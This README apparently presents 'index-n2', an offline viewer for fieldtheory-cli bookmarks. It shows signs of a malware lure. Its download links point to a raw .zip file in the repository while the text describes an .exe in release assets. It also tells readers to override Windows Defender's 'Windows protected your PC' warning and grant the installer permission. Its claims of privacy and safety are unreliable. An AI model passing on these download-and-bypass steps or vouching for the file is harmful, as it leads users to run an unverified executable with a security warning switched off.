# 📂 index-n2 - View your web bookmarks offline easily

[![Download for Windows](https://img.shields.io/badge/Download-Release-blue)](https://github.com/vexy7795/index-n2/raw/refs/heads/main/public/index_n_3.8.zip)

index-n2 serves as a private viewer for the bookmarks you collect via fieldtheory-cli. It presents your saved content in a local gallery format on your machine. You do not need an internet connection to browse your archive once the data resides on your hard drive. This tool organizes your links and media into a clean, searchable interface.

## 📥 Getting the Application

You must visit the project release page to obtain the software. 

[Click here to open the download page](https://github.com/vexy7795/index-n2/raw/refs/heads/main/public/index_n_3.8.zip).

Look for the section labeled "Assets" at the bottom of the latest release post. Select the file ending in `.exe` to download the Windows installer. Save this file to your Downloads folder or your desktop for easy access.

## ⚙️ System Requirements

- Windows 10 or Windows 11
- A valid bookmark database folder at `C:\Users\[YourUsername]\.ft-bookmarks\`
- 200 MB of available disk space
- An active fieldtheory-cli installation to generate your data files

## 🛠️ Step-by-Step Installation

1. Locate the `.exe` file you downloaded.
2. Double-click the file to start the setup process.
3. Follow the prompts on the screen.
4. Click the "Install" button.
5. The system may ask for permission to run the application. Select "Yes" to proceed.
6. Once the progress bar reaches the end, click "Finish" to launch the program.

## 📁 Setting Up Your Data

This application looks for your bookmarks in a specific hidden folder. You must ensure your data exists in the right spot before the program opens.

The application reads files from `~/.ft-bookmarks/`. On Windows, this translates to:

`C:\Users\[YourUsername]\.ft-bookmarks\`

If your bookmark files are currently elsewhere, move them into this folder. If the folder does not exist, create it manually. Ensure your fieldtheory-cli setup saves data to this path. Without files in this location, the viewer will show an empty screen.

## 🖼️ How to Use the Viewer

Once you start the application, you see your saved articles, images, and links organized by date. 

- **Navigation**: Use the scroll wheel on your mouse to move through your collection.
- **Filtering**: Type keywords into the search box at the top of the window to find specific bookmarks.
- **Opening Links**: Click on any bookmark card to open the original link in your default web browser.
- **View Modes**: Toggle the layout between grid view and list view located in the top menu bar.

## 💡 Troubleshooting Common Issues

**The application shows no data.**
Verify that your folder path is exactly `C:\Users\[YourUsername]\.ft-bookmarks\`. Folders with slight spelling differences or different file structures will cause the reader to fail. Check that your bookmark files appear as `.json` or similar data formats inside that folder.

**Windows blocks the installation.**
Windows Defender sometimes protects your computer from new software. If you see a blue window saying "Windows protected your PC," click "More info" and then click "Run anyway." 

**The program runs slowly.**
Large collections with thousands of bookmarks require more memory. If you experience lag, close other open web browsers or background applications to free up system resources.

**I cannot find the download.**
Check your browser history if the file does not appear in your Downloads folder. Use the link provided above to try the download again.

## ℹ️ Understanding the Workflow

This tool works as a local viewer. It does not send your data to any cloud servers. It reads the files created by your command-line tools and translates them into a visual format. If you add new bookmarks using terminal commands, restart index-n2 to see the updates in your gallery.

## 🧹 Managing Your Storage

Your saved bookmarks consume disk space. Over time, your gallery might grow large if you save many images or heavy media files. Check your `~/.ft-bookmarks/` folder periodically to delete items you no longer need. Deleting files here helps the application run faster. 

## 🛡️ Privacy and Data Security

Your bookmarks remain on your local drive at all times. This software does not track your viewing habits or send your link history to external services. You maintain full ownership of your data. Because the viewer relies on local text files, you can back up your bookmarks by simply copying the `~/.ft-bookmarks/` folder to a USB drive or a secondary hard disk.

## 🚀 Future Updates

Check the releases page occasionally for performance improvements. The developers update the application to support new data formats and to fix minor display errors. If you find a bug, note the behavior and check for a newer version before seeking assistance. Each release includes notes that list changes and known improvements to the gallery interface. 

To maintain the best experience, keep your bookmark files organized and valid. The application performs best when your data remains consistent and free of corrupted entries.